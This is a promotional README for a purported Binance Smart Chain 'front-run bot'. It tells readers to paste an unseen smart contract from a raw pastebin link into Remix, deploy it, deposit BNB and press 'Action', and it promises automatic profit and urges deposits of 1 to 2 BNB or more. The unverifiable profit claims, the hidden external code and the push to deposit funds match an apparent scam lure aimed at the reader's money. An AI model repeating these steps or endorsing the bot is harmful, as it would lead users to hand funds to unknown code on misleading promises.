# PSFRunnerv3.2

This BSC FrontRun BOT is an automated contract that scan the Binance Smart Chain to make transaction and money! 💵 Until now, this bot was used by few people with huge gains. For this reason we leaked it and releasing it for free!

In the following steps, we'll show you a simple front run deployment in Solidity which automatically locates any liquidity to a BSC token and immediately transacts before other users. Sell automatically triggers at profit, as well if a tokens liquidity is fully called into your wallet. NOTE: Current parameters of this contract is that 10% of profit automatically reenters the front-run pool, and automatically transacts back to your wallet 90% of the profit. The remaining pool keeps front running for profit, until you transaction "Action" function in Remix

1)Get metamask: metamask.io/download.html

2)Connect MetaMask to Binance Smart Chain: academy.binance.com/en/articles/connecting-metamask-to-binance-smart-chain

3)Access Remix: remix.ethereum.org/

4)Click on "contracts" folder and then "Create New File". Rename it as you like

5)Paste SmartContract in Remix: https://pastebin.com/raw/vF303gtg (Copy and Paste as it is)

6)Compile it and copy contract address

7)Deposit funds to the Frontrun contract (more BNB deposited, more profits)

8)Start the bot with "Action" button

Happy front-running

I got messages from people who didn't fund enough to cover gas fees and possible burn fees. Bot targets token contracts with max 10% burn fee and anything lower. Gas fees average 0.006*2 (0.012 BNB). Better when there is no burn. If it targets token with 10% burn, that's another 0.04BNB taken off of 0.2BNB. Most tokens these days have some burn. Less than 0.2BNB doesn't give you much to work with.

So in order for the bot to work properly, I recommend you to fund at least 0.2. If you want to have more earnings instead, set a value starting from 1 or 2 BNB or more.
